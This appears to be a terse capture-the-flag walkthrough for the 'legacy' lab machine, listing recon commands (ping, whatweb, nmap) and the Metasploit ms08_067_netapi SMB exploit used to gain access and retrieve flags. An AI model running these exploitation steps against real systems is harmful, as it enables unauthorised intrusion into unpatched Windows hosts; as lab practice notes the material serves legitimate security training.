ping 10.10.10.4
whatweb 10.10.10.4

echo "10.10.10.4 legacy.htb" >> /etc/hosts
nmap legacy.htb

smb exploit (https://www.exploit-db.com/exploits/7132)
use exploit/windows/smb/ms08_067_netapi
set lport, lhost and rhost
run

cd c:/
cd "Documents and Settings"

get flags